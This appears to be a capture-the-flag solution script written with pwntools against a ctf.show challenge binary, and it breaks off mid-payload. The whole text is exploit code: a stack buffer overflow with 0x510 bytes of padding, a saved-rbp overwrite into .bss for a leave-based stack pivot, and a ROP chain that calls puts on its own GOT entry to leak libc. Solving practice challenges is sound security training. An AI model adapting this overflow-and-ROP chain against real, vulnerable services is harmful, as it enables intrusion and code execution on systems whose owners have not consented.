from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28233)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
leave_addr = 0x400ada  
pop_rdi_ret = 0x400be3     # 0x0000000000400be3 : pop rdi ; ret
pop_rsi_r15_ret = 0x400be1 # 0x0000000000400be1 : pop rsi ; pop r15 ; ret
bss_addr = 0x602f00
payload  = 'a' * 0x510 + p64(bss_addr - 0x8)
payload += p64(pop_rdi_ret) + p64(elf.got["puts"]) + p64(elf.symbols["puts"])
payload += p64(pop_rdi_ret) + p64(0)
